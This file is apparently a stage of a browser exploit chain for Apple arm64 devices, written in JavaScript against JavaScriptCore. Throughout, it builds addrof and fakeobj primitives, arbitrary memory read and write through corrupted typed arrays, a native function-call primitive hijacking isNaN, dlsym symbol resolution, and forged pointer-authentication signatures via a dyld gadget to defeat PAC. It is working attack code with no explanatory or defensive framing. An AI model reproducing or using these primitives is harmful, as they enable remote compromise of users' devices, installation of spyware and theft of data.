(() => {
  const ab = new ArrayBuffer(8);
  const u64 = new BigUint64Array(ab);
  const u32 = new Uint32Array(ab);
  const u8 = new Uint8Array(ab);
  const f64 = new Float64Array(ab);
  BigInt.fromDouble = function (v) {
    f64[0] = v;
    return u64[0];
  };
  BigInt.fromBytes = function (bytes) {
    for (let i = 0; i < 8; ++i) {
      u8[i] = bytes[i];
    }
    return u64[0];
  };
  BigInt.prototype.hex = function (padNumber = 16, padChar = 0) {
    let s = '0x' + this.toString(16).padStart(padNumber, padChar);
    [][s];
    return s;
  };
  BigInt.prototype.hexPlain = function (padNumber = 16, padChar = 0) {
    let s = this.toString(16).padStart(padNumber, padChar);
    [][s];
    return s;
  };
  BigInt.prototype.asDouble = function () {
    u64[0] = this;
    return f64[0];
  };
  BigInt.prototype.noPAC = function (other) {
    return this & 0x7fffffffffn;
  };
  BigInt.prototype.asInt32s = function () {
    u64[0] = this;
    const lo = u32[0];
    const hi = u32[1];
    let new_hi = hi;
    if (hi >= 0x80000000) {
      new_hi = hi - 0x100000000 & 0xffffffff;
    }
    let new_lo = lo;
    if (lo >= 0x80000000) {
      new_lo = lo - 0x100000000 & 0xffffffff;
    }
    return [new_lo, new_hi];
  };
  const noCow = 1.1;
  unboxed_arr = [noCow];
  boxed_arr = [{}];
  func_offsets_array = new Uint8Array(0x4000).fill(0xfe);
  control_array = new BigUint64Array(0x1000);
  rw_array = new BigUint64Array(0x1000);
  control_array_8 = new BigUint64Array(0x1000);
  rw_array_8 = new Uint8Array(0x1000);
  const mem = {
    addrof: undefined,
    fakeobj: undefined,
    read64: undefined,
    write64: undefined
  };
  addrof = function (o) {
    boxed_arr[0] = o;
    return BigInt.fromDouble(unboxed_arr[0]);
  };
  fakeobj = function (addr) {
    unboxed_arr[0] = addr.asDouble();
    return boxed_arr[0];
  };
  read64 = function (where) {
    control_array[0] = where;
    let rs = rw_array[0];
    control_array[0] = 0n;
    return rs;
  };
  cmp64 = function (where, value) {
    control_array[0] = where;
    let rs = rw_array[0] == value;
    control_array[0] = 0n;
    return rs;
  };
  write64 = function (where, what) {
    control_array[0] = where;
    rw_array[0] = what;
    control_array[0] = 0n;
  };
  uread8 = function (where) {
    control_array_8[0] = where;
    let rs = rw_array_8[0];
    control_array_8[0] = 0n;
    return rs;
  };
  uwrite8 = function (where, what) {
    control_array_8[0] = where;
    rw_array_8[0] = what;
    control_array_8[0] = 0n;
  };
  cmp8_wait_for_change = function (where, value) {
    control_array_8[0] = where;
    while (rw_array_8[0] == value);
    control_array_8[0] = 0n;
  };
  mem.addrof = addrof;
  mem.fakeobj = fakeobj;
  mem.read64 = read64;
  mem.write64 = write64;
  uread64 = mem.read64;
  uwrite64 = mem.write64;
  get_cstring = function (js_str) {
    let s = js_str + "\x00";
    [][s];
    return read64(read64(addrof(s) + 0x8n) + 0x8n);
  };
  new_bigint = function () {
    return BigInt("0x3333");
  };
  update_bigint = function (bi) {
    return bi + 0x1n - 0x1n;
  };
  get_bigint_addr = function (bi) {
    return uread64(addrof(bi) + 0x18n);
  };
  fcall = undefined;
  gpu_fcall = undefined;
  func_resolve = undefined;
  pacia = undefined;
  pacib = undefined;
  LOG = undefined;
  integrated = false;
  use_js_thread = false;
  _CFObjectCopyProperty = 0n;
  load_x1x3x8 = 0n;
  fcall_14_args_write_x8 = 0n;
  jsvm_isNAN_fcall_gadget = 0n;
  jsvm_isNAN_fcall_gadget2 = 0n;
  xpac_gadget = 0n;
  stage1_js = 0n;
  stage2_js = 0n;
  thread_arg = 0n;
  get_thread_args = function () {
    return thread_arg;
  };
  let SYSLOG = 0n;
  fcall_init = function () {
    func_offsets_buffer = uread64(addrof(func_offsets_array) + 0x10n);
    let idx = 0n;
    DLSYM = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    dyld_signPointer_gadget = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    js_inputs = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    thread_arg = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    shared_cache_slide = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    jsvm_fcall_buff = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    jsvm_fcall_pc = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    jsvm_fcall_args = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    _CFObjectCopyProperty = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    load_x1x3x8 = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    fcall_14_args_write_x8 = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    jsvm_isNAN_fcall_gadget = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    jsvm_isNAN_fcall_gadget2 = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    xpac_gadget = uread64(func_offsets_buffer + idx * 0x8n);
    idx += 1n;
    stage1_js = uread64(js_inputs + 0x00n);
    let fcall_wrapper = "";
    for (let i = 0n; i < 0x50n; i += 0x8n) {
      fcall_wrapper = uread64(jsvm_fcall_buff + i).hexPlain() + fcall_wrapper;
    }
    fcall_args_wrapper = BigInt("0x" + fcall_wrapper);
    addrof_fcall_args_wrapper = get_bigint_addr(fcall_args_wrapper);
    SYSLOG = func_resolve("syslog");
  };
  fcall = function (pc, ...args) {
    uwrite64(jsvm_fcall_pc, pc);
    for (let idx = 0n; idx < BigInt(arguments.length - 1); idx++) {
      uwrite64(jsvm_fcall_args + idx * 8n, arguments[idx + 1n]);
    }
    isNaN(fcall_args_wrapper);
    return uread64(addrof_fcall_args_wrapper + 0x28n);
  };
  fcall_with_pacia = function (pc, ...args) {
    pc = pacia(pc.noPAC(), 0xc2d0n);
    uwrite64(jsvm_fcall_pc, pc);
    for (let idx = 0n; idx < BigInt(arguments.length - 1); idx++) {
      uwrite64(jsvm_fcall_args + idx * 8n, arguments[idx + 1n]);
    }
    isNaN(fcall_args_wrapper);
    return uread64(addrof_fcall_args_wrapper + 0x28n);
  };
  func_resolve = function (symbol) {
    let fptr = fcall(DLSYM, 0xFFFFFFFFFFFFFFFEn, get_cstring(symbol));
    return pacia(fptr.noPAC(), 0xc2d0n);
  };
  pacia_b_internal = function (ptr, ctx, key_type) {
    let use_addr_diversity = 0n;
    let addr = 0n;
    if (ctx >> 16n != 0n) {
      use_addr_diversity = 1n;
      addr = ctx & 0xFFFFFFFFFFFFn;
      ctx = ctx >> 48n;
    }
    return fcall(dyld_signPointer_gadget, ptr, addr, use_addr_diversity, ctx, key_type);
  };
  pacia = function (ptr, ctx) {
    return pacia_b_internal(ptr, ctx, 0n);
  };
  pacib = function (ptr, ctx) {
    return pacia_b_internal(ptr, ctx, 1n);
  };
  xpac = function (ptr) {
    let xpac_gadget_new = pacia(xpac_gadget,0xc2d0n);
    return fcall(xpac_gadget_new, ptr);
  };
  LOG_CSTRING = function (s) {
    fcall(SYSLOG, 0n, s);
  };
  LOG = function (s) {
    if (s) {
      let msg = s;
      [][msg];
      return LOG_CSTRING(get_cstring(msg));
    }
  };
})();